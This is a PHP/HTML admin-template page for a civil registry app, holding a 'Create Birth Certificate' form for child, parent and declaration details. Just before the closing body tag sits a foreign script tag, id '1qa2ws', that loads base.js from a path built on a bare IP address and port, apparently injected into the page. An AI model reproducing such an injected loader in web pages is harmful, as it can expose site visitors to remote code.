<!DOCTYPE html>
<html lang="en">
<!-- BEGIN HEAD -->



<head>
	<meta charset="utf-8" />
	<title>Civil Registry</title>
	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- dropzone -->
	<link href="../assets/plugins/dropzone/dropzone.css" rel="stylesheet" media="screen">
	<!-- Date Time item CSS -->
	<link rel="stylesheet" href="../assets/plugins/material-datetimepicker/bootstrap-material-datetimepicker.css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>
<!-- END HEAD -->

<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-dark dark-sidebar-color logo-dark dark-theme">
	<div class="page-wrapper">
		<?php require 'nav.php'?>
		<div class="page-container">
			
			<!-- start page content -->
			<div class="page-content-wrapper">
				<div class="page-content">
					<div class="page-bar">
						<div class="page-title-breadcrumb">
							<div class=" pull-left">
								<div class="page-title">Create Birth Certificate</div>
							</div>
							<ol class="breadcrumb page-breadcrumb pull-right">
								<li><i class="fa fa-home"></i>&nbsp;<a class="parent-item" href="index.php">Home</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li><a class="parent-item" href="#">Birth</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li class="active">Add Birth Certificate</li>
							</ol>
						</div>
					</div>
					<div class="row">
						<div class="col-sm-12">
							<div class="card-box">
								<div class="card-head">
									<header>Basic Information</header>
									
								
								</div>
								<form action="add_birth.inc.php" method="post">
								<div class="card-body row">
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" name="cname" type="text" id="txtFirstName" required>
											<label class="mdl-textfield__label">Child's Name</label>
										</div>
									</div>
									
								
                                   

                                           
                                    <div class="col-lg-2 p-t-20"><label >Child's Date Of Birth</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="cdob" required>
		                                  
										</div>
									</div>
									

								


									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="pob" name="cpob" required>
											<label class="mdl-textfield__label">Child's Place Of Birth</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label getmdl-select getmdl-select__fix-height txt-full-width">
											<input class="mdl-textfield__input" type="text" name = "sex" id="sample2" value="" readonly tabIndex="-1" required>
											<label for="sample2" class="pull-right margin-0">
												<i class="mdl-icon-toggle__label material-icons">keyboard_arrow_down</i>
											</label>
											<label for="sample2" class="mdl-textfield__label">Gender</label>
											<ul data-mdl-for="sample2" class="mdl-menu mdl-menu--bottom-left mdl-js-menu">
												<li class="mdl-menu__item" data-val="DE">Male</li>
												<li class="mdl-menu__item" data-val="BY">Female</li>
											</ul>
										</div>
									</div>
                                  

									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="fname">
											<label class="mdl-textfield__label">Father's Name</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="fpob">
											<label class="mdl-textfield__label">Father's Place of Birth</label>
										</div>
									</div>
									  <div><label >Father's Date Of Birth</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="fdob">
		                                  
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="fres">
											<label class="mdl-textfield__label">Father's Residence location</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="focc">
											<label class="mdl-textfield__label">Father's Occupation</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="mname" required>
											<label class="mdl-textfield__label">Mother's Name</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="mpob" required>
											<label class="mdl-textfield__label">Mother's Place of Birth</label>
										</div>
									</div>
									
									 <div class="col-lg-2 p-t-20"><label >Mother's Date Of Birth</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width" required>
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="mdob">
		                                  
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="mres" required>
											<label class="mdl-textfield__label">Mother's residence location</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="mocc" required>											<label class="mdl-textfield__label">Mother's Occupation</label>
										</div>
									</div>
									 <div class="col-lg-2 p-t-20"><label >Issiue Date</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="dissue" required>
		                                  
										</div>
									</div>
									
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="decnum" required>
											<label class="mdl-textfield__label">Birth Declaration number</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="deccen" required>
											<label class="mdl-textfield__label">Birth Declaration center</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="decname" required>
											<label class="mdl-textfield__label">Declarer's name</label>
										</div>
									</div>

									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="decpos" required>
											<label class="mdl-textfield__label">Declares's position</label>
										</div>
									</div>

									
									 <div class="col-lg-2 p-t-20"><label >Declaration date</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="decdate" required>
		                                  
										</div>
									</div>

									</div>
									
									
									
									
									<div class="col-lg-12 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="regname" required>
											<label class="mdl-textfield__label">Civil Registrer's Name</label>
										</div>
									</div>

									<div class="col-lg-12 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="secname" required>
											<label class="mdl-textfield__label">Secretary's Name</label>
										</div>
									</div>

									<div class="col-lg-12 p-t-20">
										<label class="control-label col-md-3">Upload Photo
										</label>
										<div class="col-md-12">
											<div id="id_dropzone" class="dropzone"></div>
										</div>

									</div>
									


									<div class="col-lg-12 p-t-20 text-center">
										
										<script type ="text/javascript">

			                                    function redirect(){
				                                window.location="all_birth.php";
			}
			
		                                </script>

										<button type="Submit" name="create" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 m-r-20 btn-pink">create</button>
										<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-default" onclick="redirect()">Cancel</button>
									</div>
								</div>
							</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- end page content -->
			
		</div>
		<!-- end page container -->
		<!-- start footer -->
		<?php require 'footer.php'?>
		<!-- end footer -->
	</div>
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<script src="../assets/js/pages/material-select/getmdl-select.js"></script>
	<script src="../assets/plugins/material-datetimepicker/moment-with-locales.min.js"></script>
	<script src="../assets/plugins/material-datetimepicker/bootstrap-material-datetimepicker.js"></script>
	<script src="../assets/plugins/material-datetimepicker/datetimepicker.js"></script>
	<!-- dropzone -->
	<script src="../assets/plugins/dropzone/dropzone.js"></script>
	<script src="../assets/plugins/dropzone/dropzone-call.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script></body>


</html>